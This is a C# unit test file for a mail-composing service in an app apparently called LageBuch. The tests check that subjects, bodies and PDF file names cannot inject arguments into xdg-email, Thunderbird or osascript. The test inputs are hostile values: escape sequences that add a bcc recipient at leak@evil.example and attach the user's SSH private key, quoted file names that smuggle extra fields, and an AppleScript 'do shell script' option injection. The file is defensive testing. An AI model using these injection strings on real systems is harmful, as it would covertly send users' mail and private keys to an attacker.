using System.Diagnostics;
using LageBuch.App.Services;
using LageBuch.AppLogic.Services;

namespace LageBuch.App.Tests;

public sealed class OsMailComposerTests : IDisposable
{
    private readonly string _pdf = Path.Join(Path.GetTempPath(), $"mail-{Guid.NewGuid():N}.pdf");
    private readonly List<ProcessStartInfo> _launched = new();

    public OsMailComposerTests() => File.WriteAllBytes(_pdf, new byte[] { 0x25, 0x50, 0x44, 0x46 });

    public void Dispose() => File.Delete(_pdf);

    private OsMailComposer Composer(params int[] exitCodes)
    {
        var queue = new Queue<int>(exitCodes);
        return new OsMailComposer(
            (psi, _) =>
            {
                _launched.Add(psi);
                return Task.FromResult(queue.Count > 0 ? queue.Dequeue() : 0);
            },
            TimeSpan.FromMinutes(1));
    }

    private MailDraft Draft(string? path = null) =>
        new("Einsatzbericht B3 · 19.09.2026 22:17", "Anbei der Einsatzbericht als PDF.\nBeginn: 19.09.2026 22:17", path ?? _pdf);

    [Fact]
    public void Mailto_escapes_subject_and_body_and_uses_crlf_line_breaks()
    {
        var uri = OsMailComposer.BuildMailtoUri(new MailDraft("Öl & Wasser? 100%", "a\nb", _pdf));

        Assert.Equal("mailto:?subject=%C3%96l%20%26%20Wasser%3F%20100%25&body=a%0D%0Ab", uri);
    }

    [Fact]
    public void Xdg_email_gets_every_value_as_its_own_argument()
    {
        var draft = Draft();

        Assert.Equal(
            new[] { "--utf8", "--subject", draft.Subject, "--body", draft.Body, "--attach", _pdf },
            OsMailComposer.BuildXdgEmailArguments(draft));
    }

    // xdg-email runs its values through dash's echo more than once, and each pass decodes
    // backslash escapes again: "\\0046to\\0075…" survives its URL encoding and comes out as
    // "&to=…", adding a recipient (or, for Thunderbird, a bcc='…') the Lagebuchführer never sees.
    [Fact]
    public void Xdg_email_never_receives_a_backslash()
    {
        var draft = new MailDraft(
            @"Einsatzbericht B3\\0046to\\0075leak@evil.example\\0046attach\\0075/home/lf/.ssh/id_ed25519",
            @"Anbei\\0054bcc\\0075\\0047leak@evil.example\\0047",
            _pdf);

        var args = OsMailComposer.BuildXdgEmailArguments(draft);

        Assert.All(args, a => Assert.DoesNotContain('\\', a));
    }

    // run_thunderbird decodes the attach value with `echo -e` and splices it into
    // attachment='…', so a quote or comma in the file name adds fields of its own.
    [Theory]
    [InlineData("Übung',bcc='leak@evil.example',x='.pdf")]
    [InlineData(@"Übung\x27\x2cbcc=\x27leak@evil.example\x27.pdf")]
    [InlineData("Übung%27%2cbcc=%27leak@evil.example%27.pdf")]
    public async Task On_linux_a_pdf_name_xdg_email_would_decode_skips_straight_to_mailto(string name)
    {
        if (!OperatingSystem.IsLinux())
        {
            return;
        }

        var dir = Path.Join(Path.GetTempPath(), $"mail-{Guid.NewGuid():N}");
        Directory.CreateDirectory(dir);
        var hostile = Path.Join(dir, name);
        await File.WriteAllBytesAsync(hostile, new byte[] { 0x25 });
        try
        {
            var result = await Composer(0, 0).ComposeAsync(Draft(hostile));

            Assert.Equal(MailComposeResult.OpenedWithoutAttachment, result);
            Assert.DoesNotContain(_launched, l => l.FileName == "xdg-email");
        }
        finally
        {
            Directory.Delete(dir, recursive: true);
        }
    }

    // A value osascript mistook for an option would run as AppleScript ("-e do shell script …").
    [Fact]
    public void Osascript_keeps_the_values_out_of_the_script_and_behind_a_fixed_first_argument()
    {
        var draft = new MailDraft("-e do shell script \"x\"", "body", _pdf);

        var args = OsMailComposer.BuildOsascriptArguments(draft);

        var firstValue = args.Count - 4;
        Assert.Equal("lagebuch", args[firstValue]);
        Assert.Equal(new[] { draft.Subject, draft.Body, _pdf }, args.Skip(firstValue + 1));
        Assert.All(args.Take(firstValue), a => Assert.DoesNotContain("shell script", a, StringComparison.Ordinal));
    }

    [Theory]
    [InlineData("relative.pdf")]
    [InlineData("/does/not/exist.pdf")]
    public async Task A_path_that_is_not_an_existing_absolute_file_launches_nothing(string path)
    {
        var result = await Composer().ComposeAsync(Draft(path));

        Assert.Equal(MailComposeResult.Failed, result);
        Assert.Empty(_launched);
    }

    [Fact]
    public async Task A_file_that_is_not_a_pdf_launches_nothing()
    {
        var other = Path.ChangeExtension(_pdf, ".sh");
        await File.WriteAllTextAsync(other, "#!/bin/sh");
        try
        {
            var result = await Composer().ComposeAsync(Draft(other));

            Assert.Equal(MailComposeResult.Failed, result);
            Assert.Empty(_launched);
        }
        finally
        {
            File.Delete(other);
        }
    }

    [Fact]
    public async Task On_linux_xdg_email_attaches_the_pdf()
    {
        if (!OperatingSystem.IsLinux())
        {
            return;
        }

        var result = await Composer(0).ComposeAsync(Draft());

        Assert.Equal(MailComposeResult.Attached, result);
        var launch = Assert.Single(_launched);
        Assert.Equal("xdg-email", launch.FileName);
        Assert.False(launch.UseShellExecute);
    }

    [Fact]
    public async Task On_linux_a_failing_xdg_email_falls_back_to_mailto_and_shows_the_folder()
    {
        if (!OperatingSystem.IsLinux())
        {
            return;
        }

        var result = await Composer(3, 0, 0).ComposeAsync(Draft());

        Assert.Equal(MailComposeResult.OpenedWithoutAttachment, result);
        Assert.Equal(3, _launched.Count);
        Assert.Equal("xdg-open", _launched[1].FileName);
        Assert.StartsWith("mailto:?subject=", _launched[1].ArgumentList.Single(), StringComparison.Ordinal);
        Assert.Equal(Path.GetDirectoryName(_pdf), _launched[2].ArgumentList.Single());
    }

    [Fact]
    public async Task On_linux_a_missing_mail_handler_reports_failure()
    {
        if (!OperatingSystem.IsLinux())
        {
            return;
        }

        var result = await Composer(3, 4).ComposeAsync(Draft());

        Assert.Equal(MailComposeResult.Failed, result);
    }

    // xdg-email into a Thunderbird that was not yet running, or MAPI into classic Outlook, only
    // returns once the compose window closes; a still-running launch means the window is up.
    [Fact]
    public async Task A_mail_client_that_keeps_running_counts_as_launched()
    {
        if (!OperatingSystem.IsLinux())
        {
            return;
        }

        var neverExits = new TaskCompletionSource<int>();
        var composer = new OsMailComposer((_, _) => neverExits.Task, TimeSpan.Zero);

        Assert.Equal(MailComposeResult.Attached, await composer.ComposeAsync(Draft()));
    }
}
